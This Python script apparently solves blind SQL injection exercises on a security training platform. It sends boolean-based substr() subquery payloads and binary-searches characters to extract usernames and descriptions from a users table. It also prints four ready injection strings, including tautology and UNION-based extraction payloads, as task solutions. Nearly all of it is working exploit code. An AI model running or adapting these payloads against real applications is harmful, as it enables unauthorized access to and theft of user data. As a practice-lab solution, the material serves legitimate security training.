import requests


def send_request(column, number, offset, letter, sign):
    """
    Generate sql payload and send POST request to 'https://deteact.com/platform/?lesson=sqli&bug=5'

    We hypothesize that the first user is named 'bob'
    So we can check first character of his name, it's letter 'b'
    Using substr() and subquery we get first character of first user and compare him
    ' or (SELECT substr((select username from users limit 1 offset 0),1,1)) = 'b';
    Than we get answer: User exists.
    This means that the request is working and we are in the right direction
    """
    sql_payload = f"' or (SELECT substr((select {column} from users limit 1 offset {offset}),{number},1)) {sign} '{letter}';"
    data = {'username': sql_payload}
    r = requests.post('https://deteact.com/platform/?lesson=sqli&bug=5', data=data).text
    if r == 'User exists.':
        return True
    elif r == 'User does not exist.':
        return False


def get_field(column, number, offset, letters_and_integers):
    """
    Binary search and send requests to the site
    """
    left = 0
    right = len(letters_and_integers)
    while left <= right:
        m = (left + right) // 2
        if send_request(column, number, offset, letters_and_integers[m], '='):
            return letters_and_integers[m]
        elif send_request(column, number, offset, letters_and_integers[m], '>'):
            left = m + 1
        else:
            right = m - 1
    return False


def get_rows_in_column(column):
    """
    Get row in columns and string in rows
    """
    for row in range(2, 3):
        print(f'{row}. ', end='')
        i = 0
        while True:
            i += 1
            result = get_field(column, i, row, ' 1234566789abcdefghijklmnopqrstuvwxyz')
            if result:
                print(result, end='')
            else:
                break
        print()


def print_solutions_for_tasks():
    solution = """
1. ' or 1=1 --
2. ' or 1=1 limit 1 offset 2 --
3. ' union select description, username from users limit 1 offset 2 --
4. ' and username MATCH '"'|| ( select description from users limit 1 offset 2 ) --
    """
    print(solution)


if __name__ == '__main__':
    print_solutions_for_tasks()
    print("Usernames")
    print('-' * 10)
    get_rows_in_column('username')
    print()
    print("Descriptions")
    print('-' * 10)
    get_rows_in_column('description')
